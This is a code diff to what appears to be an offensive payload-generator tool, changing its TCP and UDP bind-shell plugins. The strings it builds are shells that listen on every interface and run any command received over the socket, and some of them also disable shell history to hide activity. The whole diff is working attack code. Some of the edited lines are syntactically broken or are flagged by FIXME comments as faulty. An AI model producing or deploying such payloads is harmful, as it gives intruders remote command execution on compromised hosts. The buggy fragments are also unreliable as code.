@@ -121,11 +121,12 @@ class BindTCP(plugin.BindShell):
             self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);"
             self.shell += f"os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"{self.args.shell}\");s.close()"
         else:
-            self.shell = "exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);"
+            # FIXME onelinar from terminal has problem
+            self.shell = "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);"
             self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));"
-            self.shell += "s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();"
-            self.shell += "p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
-            self.shell += "c.sendall(p.stdout.read()+p.stderr.read())\"\"\")"
+            self.shell += "s1.listen(1);c,a=s1.accept();while True:;\td=c.recv(1024).decode();"
+            self.shell += "\tp=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
+            self.shell += "\tc.sendall(p.stdout.read()+p.stderr.read())"
         if is_write_file():
             self.shell = self.shell.replace(";", "\n")
         else:
@@ -140,16 +141,17 @@ class BindUDP(BindTCP):
 
     def make_shell(self):
         if self.args.exec == "pty":
+            # FIXME file rem.fileno error byte object (UDP)
             self.shell = "import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);"
             self.shell += f"s.bind((\"0.0.0.0\",{self.args.port}));(rem,addr)=s.recvfrom(1024);os.dup2(rem.fileno(),0);"
             self.shell += "os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");"
             self.shell += f"pty.spawn(\"{self.args.shell}\");s.close()"
         else:
             self.shell = "import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_DGRAM);"
-            self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));s1.listen(1);"
-            self.shell += "c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();"
-            self.shell += "p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
-            self.shell += "c.sendall(p.stdout.read()+p.stderr.read()))"
+            self.shell += f"s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{self.args.port}));"
+            self.shell += "while True:;\tmsg=s1.recvfrom(1024);\td=msg[0].decode();"
+            self.shell += "\tp=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);"
+            self.shell += "\ts1.sendto(p.stdout.read()+p.stderr.read(), msg[1])"
         if is_write_file():
             self.shell = self.shell.replace(";", "\n")
         else:
